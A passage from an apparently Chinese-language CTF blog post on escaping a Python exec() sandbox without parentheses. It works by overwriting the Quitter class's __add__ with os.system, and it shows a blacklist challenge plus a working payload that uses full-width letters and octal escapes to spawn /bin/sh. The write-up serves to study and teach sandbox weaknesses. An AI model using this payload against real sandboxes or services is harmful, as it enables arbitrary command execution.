class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">max</span>&gt; <span class="title">name:max</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">min</span>&gt; <span class="title">name:min</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">next</span>&gt; <span class="title">name:next</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">anext</span>&gt; <span class="title">name:anext</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">oct</span>&gt; <span class="title">name:oct</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">ord</span>&gt; <span class="title">name:ord</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">pow</span>&gt; <span class="title">name:pow</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">print</span>&gt; <span class="title">name:print</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">repr</span>&gt; <span class="title">name:repr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">round</span>&gt; <span class="title">name:round</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">setattr</span>&gt; <span class="title">name:setattr</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">sorted</span>&gt; <span class="title">name:sorted</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">sum</span>&gt; <span class="title">name:sum</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">vars</span>&gt; <span class="title">name:vars</span></span></span><br><span class="line"><span class="function"><span class="title">None</span> <span class="title">name:None</span></span></span><br><span class="line"><span class="function"><span class="title">Ellipsis</span> <span class="title">name:Ellipsis</span></span></span><br><span class="line"><span class="function"><span class="title">NotImplemented</span> <span class="title">name:NotImplemented</span></span></span><br><span class="line"><span class="function"><span class="title">False</span> <span class="title">name:False</span></span></span><br><span class="line"><span class="function"><span class="title">True</span> <span class="title">name:True</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">bool</span>'&gt; <span class="title">name:bool</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">memoryview</span>'&gt; <span class="title">name:memoryview</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">bytearray</span>'&gt; <span class="title">name:bytearray</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">bytes</span>'&gt; <span class="title">name:bytes</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">classmethod</span>'&gt; <span class="title">name:classmethod</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">complex</span>'&gt; <span class="title">name:complex</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">dict</span>'&gt; <span class="title">name:dict</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">enumerate</span>'&gt; <span class="title">name:enumerate</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">filter</span>'&gt; <span class="title">name:filter</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">float</span>'&gt; <span class="title">name:float</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">frozenset</span>'&gt; <span class="title">name:frozenset</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">property</span>'&gt; <span class="title">name:property</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">int</span>'&gt; <span class="title">name:int</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">list</span>'&gt; <span class="title">name:list</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">map</span>'&gt; <span class="title">name:map</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">object</span>'&gt; <span class="title">name:object</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">range</span>'&gt; <span class="title">name:range</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">reversed</span>'&gt; <span class="title">name:reversed</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">set</span>'&gt; <span class="title">name:set</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">slice</span>'&gt; <span class="title">name:slice</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">staticmethod</span>'&gt; <span class="title">name:staticmethod</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">str</span>'&gt; <span class="title">name:str</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">super</span>'&gt; <span class="title">name:super</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">tuple</span>'&gt; <span class="title">name:tuple</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">type</span>'&gt; <span class="title">name:type</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">zip</span>'&gt; <span class="title">name:zip</span></span></span><br><span class="line"><span class="function"><span class="title">True</span> <span class="title">name:__debug__</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">BaseException</span>'&gt; <span class="title">name:BaseException</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">Exception</span>'&gt; <span class="title">name:Exception</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">TypeError</span>'&gt; <span class="title">name:TypeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">StopAsyncIteration</span>'&gt; <span class="title">name:StopAsyncIteration</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">StopIteration</span>'&gt; <span class="title">name:StopIteration</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">GeneratorExit</span>'&gt; <span class="title">name:GeneratorExit</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">SystemExit</span>'&gt; <span class="title">name:SystemExit</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">KeyboardInterrupt</span>'&gt; <span class="title">name:KeyboardInterrupt</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ImportError</span>'&gt; <span class="title">name:ImportError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ModuleNotFoundError</span>'&gt; <span class="title">name:ModuleNotFoundError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">OSError</span>'&gt; <span class="title">name:OSError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">OSError</span>'&gt; <span class="title">name:EnvironmentError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">OSError</span>'&gt; <span class="title">name:IOError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">EOFError</span>'&gt; <span class="title">name:EOFError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">RuntimeError</span>'&gt; <span class="title">name:RuntimeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">RecursionError</span>'&gt; <span class="title">name:RecursionError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">NotImplementedError</span>'&gt; <span class="title">name:NotImplementedError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">NameError</span>'&gt; <span class="title">name:NameError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnboundLocalError</span>'&gt; <span class="title">name:UnboundLocalError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">AttributeError</span>'&gt; <span class="title">name:AttributeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">SyntaxError</span>'&gt; <span class="title">name:SyntaxError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">IndentationError</span>'&gt; <span class="title">name:IndentationError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">TabError</span>'&gt; <span class="title">name:TabError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">LookupError</span>'&gt; <span class="title">name:LookupError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">IndexError</span>'&gt; <span class="title">name:IndexError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">KeyError</span>'&gt; <span class="title">name:KeyError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ValueError</span>'&gt; <span class="title">name:ValueError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnicodeError</span>'&gt; <span class="title">name:UnicodeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnicodeEncodeError</span>'&gt; <span class="title">name:UnicodeEncodeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnicodeDecodeError</span>'&gt; <span class="title">name:UnicodeDecodeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnicodeTranslateError</span>'&gt; <span class="title">name:UnicodeTranslateError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">AssertionError</span>'&gt; <span class="title">name:AssertionError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ArithmeticError</span>'&gt; <span class="title">name:ArithmeticError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">FloatingPointError</span>'&gt; <span class="title">name:FloatingPointError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">OverflowError</span>'&gt; <span class="title">name:OverflowError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ZeroDivisionError</span>'&gt; <span class="title">name:ZeroDivisionError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">SystemError</span>'&gt; <span class="title">name:SystemError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ReferenceError</span>'&gt; <span class="title">name:ReferenceError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">MemoryError</span>'&gt; <span class="title">name:MemoryError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">BufferError</span>'&gt; <span class="title">name:BufferError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">Warning</span>'&gt; <span class="title">name:Warning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UserWarning</span>'&gt; <span class="title">name:UserWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">EncodingWarning</span>'&gt; <span class="title">name:EncodingWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">DeprecationWarning</span>'&gt; <span class="title">name:DeprecationWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">PendingDeprecationWarning</span>'&gt; <span class="title">name:PendingDeprecationWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">SyntaxWarning</span>'&gt; <span class="title">name:SyntaxWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">RuntimeWarning</span>'&gt; <span class="title">name:RuntimeWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">FutureWarning</span>'&gt; <span class="title">name:FutureWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ImportWarning</span>'&gt; <span class="title">name:ImportWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">UnicodeWarning</span>'&gt; <span class="title">name:UnicodeWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">BytesWarning</span>'&gt; <span class="title">name:BytesWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ResourceWarning</span>'&gt; <span class="title">name:ResourceWarning</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ConnectionError</span>'&gt; <span class="title">name:ConnectionError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">BlockingIOError</span>'&gt; <span class="title">name:BlockingIOError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">BrokenPipeError</span>'&gt; <span class="title">name:BrokenPipeError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ChildProcessError</span>'&gt; <span class="title">name:ChildProcessError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ConnectionAbortedError</span>'&gt; <span class="title">name:ConnectionAbortedError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ConnectionRefusedError</span>'&gt; <span class="title">name:ConnectionRefusedError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ConnectionResetError</span>'&gt; <span class="title">name:ConnectionResetError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">FileExistsError</span>'&gt; <span class="title">name:FileExistsError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">FileNotFoundError</span>'&gt; <span class="title">name:FileNotFoundError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">IsADirectoryError</span>'&gt; <span class="title">name:IsADirectoryError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">NotADirectoryError</span>'&gt; <span class="title">name:NotADirectoryError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">InterruptedError</span>'&gt; <span class="title">name:InterruptedError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">PermissionError</span>'&gt; <span class="title">name:PermissionError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">ProcessLookupError</span>'&gt; <span class="title">name:ProcessLookupError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">class</span> '<span class="title">TimeoutError</span>'&gt; <span class="title">name:TimeoutError</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">built</span>-<span class="title">in</span> <span class="title">function</span> <span class="title">open</span>&gt; <span class="title">name:open</span></span></span><br><span class="line"><span class="function"><span class="title">Use</span> <span class="title">quit</span>() <span class="title">or</span> <span class="title">Ctrl</span>-<span class="title">D</span> (<span class="title">i.e</span>. <span class="title">EOF</span>) <span class="title">to</span> <span class="title">exit</span> <span class="title">name:quit</span></span></span><br><span class="line"><span class="function"><span class="title">Use</span> <span class="title">exit</span>() <span class="title">or</span> <span class="title">Ctrl</span>-<span class="title">D</span> (<span class="title">i.e</span>. <span class="title">EOF</span>) <span class="title">to</span> <span class="title">exit</span> <span class="title">name:exit</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">c</span>) 2001-2022 <span class="title">Python</span> <span class="title">Software</span> <span class="title">Foundation</span>.</span></span><br><span class="line"><span class="function"><span class="title">All</span> <span class="title">Rights</span> <span class="title">Reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">c</span>) 2000 <span class="title">BeOpen.com</span>.</span></span><br><span class="line"><span class="function"><span class="title">All</span> <span class="title">Rights</span> <span class="title">Reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">c</span>) 1995-2001 <span class="title">Corporation</span> <span class="title">for</span> <span class="title">National</span> <span class="title">Research</span> <span class="title">Initiatives</span>.</span></span><br><span class="line"><span class="function"><span class="title">All</span> <span class="title">Rights</span> <span class="title">Reserved</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">c</span>) 1991-1995 <span class="title">Stichting</span> <span class="title">Mathematisch</span> <span class="title">Centrum</span>, <span class="title">Amsterdam</span>.</span></span><br><span class="line"><span class="function"><span class="title">All</span> <span class="title">Rights</span> <span class="title">Reserved</span>. <span class="title">name:copyright</span></span></span><br><span class="line"><span class="function">    <span class="title">Thanks</span> <span class="title">to</span> <span class="title">CWI</span>, <span class="title">CNRI</span>, <span class="title">BeOpen.com</span>, <span class="title">Zope</span> <span class="title">Corporation</span> <span class="title">and</span> <span class="title">a</span> <span class="title">cast</span> <span class="title">of</span> <span class="title">thousands</span></span></span><br><span class="line"><span class="function">    <span class="title">for</span> <span class="title">supporting</span> <span class="title">Python</span> <span class="title">development</span>.  <span class="title">See</span> <span class="title">www.python.org</span> <span class="title">for</span> <span class="title">more</span> <span class="title">information</span>. <span class="title">name:credits</span></span></span><br><span class="line"><span class="function"><span class="title">Type</span> <span class="title">license</span>() <span class="title">to</span> <span class="title">see</span> <span class="title">the</span> <span class="title">full</span> <span class="title">license</span> <span class="title">text</span> <span class="title">name:license</span></span></span><br><span class="line"><span class="function"><span class="title">Type</span> <span class="title">help</span>() <span class="title">for</span> <span class="title">interactive</span> <span class="title">help</span>, <span class="title">or</span> <span class="title">help</span>(<span class="title">object</span>) <span class="title">for</span> <span class="title">help</span> <span class="title">about</span> <span class="title">object</span>. <span class="title">name:help</span></span></span><br></pre></td></tr></table></figure>
+
+<p><code>quit()  exit() licnese() help()</code>四个函数，并没有显现”&lt; xxx  ‘xxxx’ &gt;” 而是像被调用执行后返回一个字符串。</p>
+<h3 id="内鬼-sitebuiltins"><a href="#内鬼-sitebuiltins" class="headerlink" title="内鬼_sitebuiltins"></a>内鬼_sitebuiltins</h3><p>我以quit为突破口，深入研究下python 手册与python 源码。</p>
+<p>在python 手册内置常量（<a href="https://docs.python.org/zh-cn/3/library/constants.html#built-in-consts）这一节发现一个有意思的描述：" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/library/constants.html#built-in-consts）这一节发现一个有意思的描述：</a></p>
+<blockquote>
+<h2 id="由-site-模块添加的常量"><a href="#由-site-模块添加的常量" class="headerlink" title="由 site 模块添加的常量"></a>由 <a href="https://docs.python.org/zh-cn/3/library/site.html#module-site" target="_blank" rel="noopener"><code>site</code></a> 模块添加的常量</h2><p><a href="https://docs.python.org/zh-cn/3/library/site.html#module-site" target="_blank" rel="noopener"><code>site</code></a> 模块（在启动期间自动导入，除非给出 <a href="https://docs.python.org/zh-cn/3/using/cmdline.html#cmdoption-S" target="_blank" rel="noopener"><code>-S</code></a> 命令行选项）将几个常量添加到内置命名空间。 它们对交互式解释器 shell 很有用，并且不应在程序中使用。</p>
+<ul>
+<li><p><strong>quit</strong>(<em>code=None</em>)</p>
+</li>
+<li><p><strong>exit</strong>(<em>code=None</em>)</p>
+<p>当打印此对象时，会打印出一条消息，例如“Use quit() or Ctrl-D (i.e. EOF) to exit”，当调用此对象时，将使用指定的退出代码来引发 <a href="https://docs.python.org/zh-cn/3/library/exceptions.html#SystemExit" target="_blank" rel="noopener"><code>SystemExit</code></a>。</p>
+</li>
+<li><p><strong>copyright</strong></p>
+</li>
+<li><p><strong>credits</strong></p>
+<p>打印或调用的对象分别打印版权或作者的文本。</p>
+</li>
+<li><p><strong>license</strong></p>
+<p>当打印此对象时，会打印出一条消息“Type license() to see the full license text”，当调用此对象时，将以分页形式显示完整的许可证文本（每次显示一屏）。</p>
+</li>
+</ul>
+</blockquote>
+<p>quit 这些函数是用site模块添加的方法。</p>
+<p>根据site模块，发现手册中提供了site模块的源码地址 <a href="https://github.com/python/cpython/tree/3.11/Lib/site.py" target="_blank" rel="noopener">Lib/site.py</a></p>
+<p>在源码中发现了一个有意思的代码块：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setquit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Define new builtins 'quit' and 'exit'.</span></span><br><span class="line"><span class="string">    These are objects which make the interpreter exit when called.</span></span><br><span class="line"><span class="string">    The repr of each object contains a hint at how it works.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> os.sep == <span class="string">'\\'</span>:</span><br><span class="line">        eof = <span class="string">'Ctrl-Z plus Return'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        eof = <span class="string">'Ctrl-D (i.e. EOF)'</span></span><br><span class="line"></span><br><span class="line">    builtins.quit = _sitebuiltins.Quitter(<span class="string">'quit'</span>, eof)</span><br><span class="line">    builtins.exit = _sitebuiltins.Quitter(<span class="string">'exit'</span>, eof)</span><br></pre></td></tr></table></figure>
+
+<p>builtins.quit居然是``_sitebuiltins.Quitter <code>类的实例。继续根据_</code>sitebuiltins.Quitter`源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Quitter</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, eof)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.eof = eof</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Use %s() or %s to exit'</span> % (self.name, self.eof)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, code=None)</span>:</span></span><br><span class="line">        <span class="comment"># Shells like IDLE catch the SystemExit, but listen when their</span></span><br><span class="line">        <span class="comment"># stdin wrapper is closed.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sys.stdin.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">raise</span> SystemExit(code)</span><br></pre></td></tr></table></figure>
+
+<p>Quitter定义没有任何保护,于是我们考虑篡改它的属性。虽然没有<code>__add__</code>，但是我们强行加一个试试。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; quit.__class__.__add__=os.system</span><br><span class="line">&gt;&gt;&gt; quit+<span class="string">'/bin/sh'</span></span><br><span class="line">$ ls</span><br><span class="line">Desktop    glibc-all-in-one   Pictures	Pwngdb	   Videos</span><br></pre></td></tr></table></figure>
+
+<p> 好家伙，我们直接将<code>__add__</code>,篡改为的os.system.</p>
+<h5 id="意外收获"><a href="#意外收获" class="headerlink" title="意外收获"></a>意外收获</h5><p>在看Quitter定义源码时，发现一个有意思的地方：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">'Use %s() or %s to exit'</span> % (self.name, self.eof)</span><br></pre></td></tr></table></figure>
+
+<p>这和我们直接在python 交换行中输入quit 得到的东西很像。</p>
+<p>查寻手册发现：</p>
+<blockquote>
+<p>object.<strong><strong>repr</strong></strong>(<em>self</em>)<a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#object.__repr__" target="_blank" rel="noopener">¶</a></p>
+<p>由 <a href="https://docs.python.org/zh-cn/3/library/functions.html#repr" target="_blank" rel="noopener"><code>repr()</code></a> 内置函数调用以输出一个对象的“官方”字符串表示。如果可能，这应类似一个有效的 Python 表达式，能被用来重建具有相同取值的对象（只要有适当的环境）。如果这不可能，则应返回形式如 <code>&lt;...some useful description...&gt;</code> 的字符串。返回值必须是一个字符串对象。如果一个类定义了 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#object.__repr__" target="_blank" rel="noopener"><code>__repr__()</code></a> 但未定义 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#object.__str__" target="_blank" rel="noopener"><code>__str__()</code></a>，则在需要该类的实例的“非正式”字符串表示时也会使用 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#object.__repr__" target="_blank" rel="noopener"><code>__repr__()</code></a>。</p>
+<p>此方法通常被用于调试，因此确保其表示的内容包含丰富信息且无歧义是很重要的。</p>
+</blockquote>
+<p>原莱我们输入对象名返回的值，如<code>&lt;class &#39;xxx&#39;&gt;</code> 、<code>&lt;built-in function xxxx&gt;</code>是通过调用<code>__repr__</code> 方法即时返回的字符串。</p>
+<p>那么我们只要修改类的<code>__repr__</code> 方法，在输入该类实例变量名是就可以调用我们的方法。但，美中不足的是传参数不好控制。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在测试中写了一道，算是对那个不求甚解的自己 的 一种记录吧…..(有其他解的大佬，欢迎分享)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string </span><br><span class="line">line = input(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line">blacklist = string.ascii_letters+<span class="string">"()%&#123;&#125;[]@ "</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">in</span> line.lower():</span><br><span class="line">        <span class="keyword">raise</span> Exception()</span><br><span class="line"></span><br><span class="line">exec(line)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ｑｕｉｔ.__ｃｌａｓｓ__.__ａｄｄ__=__ｉｍｐｏｒｔ__;ｑｕｉｔ.__ｃｌａｓｓ__.__ａｄｄ__=ｑｕｉｔ+<span class="string">'\157\163'</span>;ｑｕｉｔ.__ｃｌａｓｓ__.__ａｄｄ__=ｑｕｉｔ.__ｃｌａｓｓ__.__ａｄｄ__.ｓｙｓｔｅｍ;ｑｕｉｔ+<span class="string">'\57\142\151\156\57\163\150'</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#</a></p>
+<p><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#command-execution-libraries" target="_blank" rel="noopener">https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#command-execution-libraries</a></p>
+<p><a href="https://github.com/python/cpython/blob/3.11/Lib/site.py" target="_blank" rel="noopener">https://github.com/python/cpython/blob/3.11/Lib/site.py</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2023/04/20/python-sandbox%20bypass%20'()'%20to%20%20runing%20function/">Python-sandbox bypass &#39;(&#39; and &#39;)&#39; to  calling function</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
+        <p><span>发布时间:</span>2023-04-20, 23:01:42</p>
+        <p><span>最后更新:</span>2023-04-20, 23:01:27</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2023/04/20/python-sandbox%20bypass%20'()'%20to%20%20runing%20function/" title="Python-sandbox bypass &#39;(&#39; and &#39;)&#39; to  calling function">lexsd6.github.io/2023/04/20/python-sandbox%20bypass%20&#39;()&#39;%20to%20%20runing%20function/</a>
+            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2023/04/20/python-sandbox%20bypass%20&#39;()&#39;%20to%20%20runing%20function/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
